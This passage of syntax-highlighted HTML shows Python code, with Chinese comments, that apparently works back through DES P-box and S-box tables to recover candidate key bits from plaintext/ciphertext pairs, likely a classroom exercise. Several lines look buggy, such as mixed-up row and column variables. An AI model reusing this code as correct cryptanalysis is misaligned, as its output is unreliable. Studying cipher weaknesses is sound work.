class="p">)</span>
         <span class="n">sp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">((</span><span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">1</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span><span class="o">**</span><span class="mi">0</span><span class="p">),</span><span class="mi">48</span><span class="p">,</span><span class="mi">64</span><span class="p">)</span>
         <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
            <span class="n">row</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">clum</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">row</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">//</span> <span class="mi">16</span>
            <span class="n">clum</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">16</span>
            <span class="n">_num1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">_num2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">_num1</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">clum</span><span class="p">[</span><span class="n">j</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
            <span class="n">_num2</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">clum</span><span class="p">[</span><span class="n">j</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
            <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">_num1</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="mi">0</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="mi">3</span><span class="p">]),</span><span class="nb">int</span><span class="p">(</span><span class="n">_num1</span><span class="p">[</span><span class="mi">1</span><span class="p">])]</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="c1">#p盒置换</span>
<span class="n">p_box</span> <span class="o">=</span> <span class="p">[</span><span class="mi">16</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span>
        <span class="mi">1</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span>
        <span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span>
        <span class="mi">19</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">25</span><span class="p">]</span>
<span class="n">_p_box</span> <span class="o">=</span> <span class="p">[</span><span class="mi">9</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span>
          <span class="mi">24</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span>
          <span class="mi">8</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span>
          <span class="mi">32</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">21</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">p_box_replace</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
        <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">[</span><span class="n">p_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">result</span>
<span class="k">def</span> <span class="nf">_p_box_replace</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
        <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">[</span><span class="n">_p_box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">key_poss</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">miwen</span><span class="p">,</span> <span class="n">shu</span><span class="p">):</span>
    <span class="c1">#print("明文", shu, ":", plaintext)</span>
    <span class="c1"># #print("密钥:",key_table)</span>
    <span class="c1">#将明文和密钥16进制字符串转为2进制列表</span>
    <span class="n">plaintext_result</span> <span class="o">=</span> <span class="n">hex_to_binary</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
    <span class="n">miwen_result</span> <span class="o">=</span> <span class="n">hex_to_binary</span><span class="p">(</span><span class="n">miwen</span><span class="p">)</span>
    <span class="c1">#将明文和密钥2进制字符列表转为2进制整型列表</span>
    <span class="n">plaintext_result_int</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="n">plaintext_result</span><span class="p">))</span>
    <span class="n">miwen_result_int</span> <span class="o">=</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="n">miwen_result</span><span class="p">))</span>
    <span class="c1">#对明文做初始置换</span>
    <span class="n">initial_table</span><span class="o">=</span><span class="n">substitution</span><span class="p">(</span><span class="n">plaintext_result_int</span><span class="p">)</span>
    <span class="n">initial_str</span><span class="o">=</span><span class="n">binary_to_hexadecimal</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span><span class="n">initial_table</span><span class="p">)))</span>
    <span class="c1">#print("明文", shu, "的初始置换:",initial_str)</span>
    <span class="n">L_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">initial_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)]</span>
    <span class="n">R_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">initial_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">64</span><span class="p">)]</span>
    <span class="c1">#print("明文", shu, "的R边:", R_list)</span>
    <span class="c1"># L_new_list=R_list</span>
    <span class="c1">#进行扩展置换</span>
    <span class="n">extend_list</span><span class="o">=</span><span class="n">extend_replacement</span><span class="p">(</span><span class="n">R_list</span><span class="p">)</span>
    <span class="c1"># #print (extend_list)</span>
    <span class="n">new_extend_list</span><span class="o">=</span> <span class="p">[[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">12</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">18</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="mi">24</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">30</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="mi">36</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">,</span> <span class="mi">42</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">extend_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="mi">48</span><span class="p">)]]</span>
    <span class="c1">#print("明文", shu, "的扩展置换:", new_extend_list)</span>

    <span class="c1">#miwen caozuo</span>
    <span class="c1">#IP ni zhihuan</span>
    <span class="n">_IP_table</span> <span class="o">=</span> <span class="n">reverse_substitution</span><span class="p">(</span><span class="n">miwen_result_int</span><span class="p">)</span>
    <span class="n">_IP__str</span> <span class="o">=</span> <span class="n">binary_to_hexadecimal</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">_IP_table</span><span class="p">)))</span>
    <span class="c1"># #print(_IP__str)</span>
    <span class="c1">#miwen L R</span>
    <span class="n">_L_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">_IP_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)]</span>
    <span class="n">_R_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">_IP_table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">64</span><span class="p">)]</span>
    <span class="n">_r_list_new</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">_R_list</span><span class="p">,</span> <span class="n">L_list</span><span class="p">)</span>
    <span class="c1">#_P zhihuan</span>
    <span class="n">_p_box_list</span><span class="o">=</span><span class="n">_p_box_replace</span><span class="p">(</span><span class="n">_r_list_new</span><span class="p">)</span>
    <span class="n">new_p_box_list</span> <span class="o">=</span> <span class="p">[[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">16</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">20</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">24</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="mi">28</span><span class="p">)],</span>
                      <span class="p">[</span><span class="n">_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">28</span><span class="p">,</span> <span class="mi">32</span><span class="p">)],]</span>
    <span class="c1"># #print(new_p_box_list)</span>
    <span class="n">s_in</span> <span class="o">=</span> <span class="p">[[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]],</span>
         <span class="p">[[],[],[],[]]]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
            <span class="n">sp</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
                  <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]]</span>
            <span class="n">t</span> <span class="o">=</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">1</span> <span class="o">+</span> \
                <span class="n">new_p_box_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">0</span>
            <span class="n">sp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
            <span class="c1">#print(sp[0])</span>
            <span class="n">sp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
            <span class="n">sp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span>
            <span class="n">sp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
            <span class="n">row</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
                   <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]]</span>
            <span class="n">clum</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
                    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]]</span>
            <span class="c1"># row[i][0]= 0</span>
            <span class="c1"># #print(row[i])</span>
            <span class="n">clum</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
            <span class="n">_num1</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]]</span>
            <span class="n">_num2</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
                     <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]]</span>
            <span class="n">_num1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
            <span class="n">_num2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">clum</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">])[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
            <span class="n">s_in</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">_num1</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">_num2</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">3</span><span class="p">]),</span>
                            <span class="nb">int</span><span class="p">(</span><span class="n">_num1</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">1</span><span class="p">])]</span>
        <span class="c1"># return result</span>
    <span class="c1"># #print(s_in)</span>
    <span class="n">key_possible</span> <span class="o">=</span> <span class="p">[</span>
